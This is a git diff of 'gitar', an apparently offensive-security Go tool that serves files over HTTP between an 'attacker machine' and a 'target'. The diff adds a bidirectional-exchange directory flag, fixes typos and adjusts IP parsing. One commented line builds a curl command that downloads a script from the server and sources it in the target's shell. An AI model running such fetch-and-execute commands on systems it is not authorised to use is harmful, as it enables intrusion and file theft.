@@ -34,7 +34,8 @@ Launch an HTTP server to ease file sharing
   --secret                 provide the secret that will prefix URL paths. (by default: auto-generated)
   --dry-run                do not launch gitar server, only return command to load shortcuts
   --windows                specify that the target machine is a windows
-  -b                       bidirectionnal exchange: push file on target from the attacker machine without installiing anything on target
+  -b                       bidirectional exchange: push file on target from the attacker machine without installiing anything on target
+  -bd                      Specify bidirectional exchange dir
 
   -h, --help                  prints help information 
 `
@@ -45,7 +46,8 @@ func main() {
 	serverIp := flag.String("e", "", "Server external reachable ip")
 	flag.BoolVar(&detectExternal, "ext", false, "Detect external ip and use it for gitar shortcut. If use with -e, the value of -e flag will be overwritten")
 	flag.BoolVar(&windows, "windows", false, "Target machine is a windows (copy paste windows shortcuts)")
-	flag.BoolVar(&bidirectional, "bidi", false, "Bidirectionnal exchange. You cna also push file on target from the attacker machine (without installign anything on target)")
+	flag.BoolVar(&bidirectional, "bidi", false, "bidirectional exchange. You cna also push file on target from the attacker machine (without installign anything on target)")
+	bidiDir := flag.String("bd", "", "Bidirectional dir")
 	port := flag.String("p", "9237", "Port to serve on")
 	dlDir := flag.String("d", ".", "Point to the directory of static file to serve")
 	upDir := flag.String("u", "./", "Point to the directory where file are uploaded")
@@ -102,8 +104,11 @@ func main() {
 
 	//bidirectional
 	var mktempDir string
+	if *bidiDir == "" {
+		*bidiDir = "/tmp"
+	}
 	if bidirectional {
-		mktemp, err := exec.Command("mktemp", "-d").Output()
+		mktemp, err := exec.Command("mktemp", "-p", *bidiDir, "-d").Output()
 		if err != nil {
 			fmt.Println(err)
 		} else {
@@ -111,7 +116,8 @@ func main() {
 			mktempDir = strings.ReplaceAll(string(mktemp), "\n", "")
 
 			//Configure alias for host
-			alias, err := exec.Command("mktemp", "--suffix=gitar").Output()
+			//alias, err := exec.Command("mktemp", "--suffix=gitar").Output()
+			alias, err := exec.Command("mktemp", "-p", *bidiDir, "gitarXXXXXX").Output() //alpine compliant
 			if err != nil {
 				fmt.Println(err)
 			} else {
@@ -147,7 +153,7 @@ func main() {
 		url = protocol + ip + ":" + p + "/" + *secret
 	}
 
-	cfg := &config.Config{ServerIP: *serverIp, Port: *port, DownloadDir: *dlDir, UploadDir: *upDir + "/", IsCopied: *copyArg, Tls: *tls, Url: url, Completion: *completion, Secret: *secret, BidirectionnalDir: mktempDir}
+	cfg := &config.Config{ServerIP: *serverIp, Port: *port, DownloadDir: *dlDir, UploadDir: *upDir + "/", IsCopied: *copyArg, Tls: *tls, Url: url, Completion: *completion, Secret: *secret, BidirectionalDir: mktempDir}
 
 	//Set up messages
 	//setUpMsgLinux := "curl -s " + url + "/alias > /tmp/alias && . /tmp/alias && rm /tmp/alias"
@@ -215,6 +221,7 @@ func getHostIP() (ip string, err error) {
 	reader := bufio.NewReader(r)
 	line, _, err := reader.ReadLine()
 	ip = string(line)
-	ip = strings.ReplaceAll(ip, " ", "")
+	ip = strings.Split(ip, "\n")[0]
+	ip = strings.Split(ip, " ")[0]
 	return ip, err
 }
